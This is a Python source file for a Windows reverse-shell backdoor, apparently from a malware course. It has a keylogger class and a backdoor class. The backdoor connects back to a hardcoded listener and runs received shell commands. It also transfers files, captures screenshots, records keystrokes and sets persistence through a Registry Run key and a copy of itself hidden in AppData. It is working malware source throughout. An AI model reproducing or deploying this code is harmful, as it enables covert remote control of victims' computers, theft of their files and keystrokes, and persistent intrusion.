import subprocess, os, sys, shutil
import socket, json
import base64

# pip install  opencv-python-headless for pyinstaller
import pyautogui
import numpy as np
import cv2

import pynput.keyboard
import threading


class Keylogger:
    def __init__(self):
        self.log = ""
        print("Keylogger started")

    def append_log(self, keystroke):
        self.log = self.log + keystroke

    def process_key(self, key):
        try:
            self.log = self.log + str(key.char)
        except AttributeError:  # to print all non ascii characters like space ....
            if key == key.space:
                self.log = self.log + " "
            elif key == key.up:
                self.log = self.log + "[up arrow]"
            elif key == key.down:
                self.log = self.log + "[down arrow]"
            elif key == key.left:
                self.log = self.log + "[left arrow]"
            elif key == key.right:
                self.log = self.log + "[right arrow]"
            elif key == key.enter:
                self.log = self.log + " [Enter button]\n"
            else:
                self.log = self.log + " " + str(key) + " "
        print(self.log)
        self.write_file(self.log)

    def write_file(self, input):
        with open("keylogger.txt", "a+") as file:
            file.write(input + "\n")

    def report(self):  # print the log every 5 secs and then resetting the log var
        self.write_file(self.log)
        # print(self.log)

    def start(self):

        Keyboard_listener = pynput.keyboard.Listener(
            on_press=self.process_key)  # call that fn every time a user press a key on the keyboard
        with Keyboard_listener:
            Keyboard_listener.join()


class Backdoor:
    """
    1-execute commands
    2-interacting with file system
    3-download and upload files
    4-Take screenshots
    """

    # connection will close if we received more than the buffer size 1024 bytes solutions :
    # send size of the data as a header
    # append a mark at the end of a data
    # serialization
    def __init__(self, target_ip, target_port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((target_ip, target_port))  # initiate the connection
        self.connection.send(b"\n[+]connection Established\n")

    def execute_command(self, command):
        try:
            DEVNULL = open(os.devnull, "wb")
            result = subprocess.check_output(command, shell=True, stderr=DEVNULL, stdin=DEVNULL)
            return result
        except subprocess.CalledProcessError:
            result = "command not found"
            return result.encode("UTF-8")

    def serialize(self, data):  # convert to json format to be able to send it over network
        jason_data = json.dumps(data.decode())
        self.connection.send(jason_data.encode())

    def serialize_receive(self):  # convert from json to string
        jason_data = ""
        while True:
            try:
                jason_data = jason_data + self.connection.recv(1024).decode()
                return json.loads(jason_data)
            except ValueError:
                continue

    def change_dir(self, path):
        try:
            os.chdir(path)
            result = "[+] changing working directory to " + path
            return result.encode()
        except OSError:
            return "No such Directory ".encode()

    def download_file(self, path):
        try:
            with open(path, "rb") as file:  # with b method we will only read text files
                return base64.b64encode(file.read())  # convert base64 to be to able send non ascii char (not text)
        except FileNotFoundError:
            return "[-] Error No such file ".encode()

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] uploaded successfully ".encode()

    def screenshot(self):
        # take screenshot using pyautogui
        image = pyautogui.screenshot()
        # image.save(r'E:\courses\python\scripts\malware\screenshot1.png')
        # since the pyautogui takes as a PIL(pillow) and in RGB we need to convert it to numpy array and BGR
        # so we can write it to the disk
        image = cv2.cvtColor(np.array(image), cv2.COLOR_RGB2BGR)

        # writing it to the disk using opencv
        cv2.imwrite("image.png", image)
        return self.download_file("image.png")

    def persistence(self):
        file_location = os.environ[
                            "appdata"] + "\\reverse_shell.py"  # store our backdoor in appdata folder that is hidden by default and get the path of the folder by os.environ
        if not os.path.exists(file_location):  # if the file exists don't copy again
            shutil.copyfile(sys.executable, file_location)  # copy our backdoor to a hidden place
            # save our backdoor in registry
            subprocess.call(
                'REG ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v shell  /t REG_SZ  /f /d " ' + file_location + ' "  ',
                shell=True)
        return "[+] Persistence done".encode()

    def run(self):
        while True:
            received_data = self.serialize_receive()
            try:
                if received_data[0] == "exit":
                    self.connection.close()  # close the connection
                    exit()
                elif received_data[0] == "cd" and len(received_data) > 1:
                    command_result = self.change_dir(received_data[1])
                elif received_data[0] == "download":
                    command_result = self.download_file(received_data[1])
                elif received_data[0] == "upload":
                    command_result = self.write_file(received_data[1], received_data[2])
                elif received_data[0] == "screenshot":
                    command_result = self.screenshot()
                    os.remove("image.png")
                elif received_data[0] == "persistence":
                    command_result = self.persistence()
                elif received_data[0] == "getpid":
                    command_result = str(os.getpid()).encode()
                elif received_data[0] == "help" or received_data[0] == "?":
                    command_result = "\nhelp \t\t\t: show backdoor commands\nscreenshot \t\t: Take a scrrenshot\nkeylogger \t\t: Start a keylogger\ndownload <file> : download a file from the target\nupload <file>   : upload a file to the target\ngetpid \t\t\t: get shell's process id\n  ".encode()
                elif received_data[0] == "keylogger":
                    logging = Keylogger()
                    t = threading.Thread(target=logging.start())
                    t.start()

                else:
                    command_result = self.execute_command(received_data)
                self.serialize(command_result)
            except Exception:
                self.serialize("[-] Error in Command Execution".encode())


def main():
    target_ip ="127.0.0.1"
    target_port = 5555
    try:
        mybackdoor = Backdoor(target_ip, target_port)
        mybackdoor.run()
    except Exception:  # exit without pop up any error message (silently)
        sys.exit()


if __name__ == "__main__":
    main()
